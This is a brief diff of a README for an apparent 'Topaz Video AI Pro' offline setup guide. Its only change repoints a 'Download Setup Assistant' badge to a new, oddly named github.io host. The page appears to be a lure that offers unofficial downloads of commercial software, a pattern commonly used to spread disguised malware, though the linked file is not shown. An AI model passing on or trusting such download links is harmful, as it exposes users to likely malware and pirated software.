@@ -1,6 +1,6 @@
 # Topaz Video AI Pro — Offline Setup Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://topaz-video-ai-pro.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://topaz-aipro-video1download.github.io/.github/)
 
 ---
 
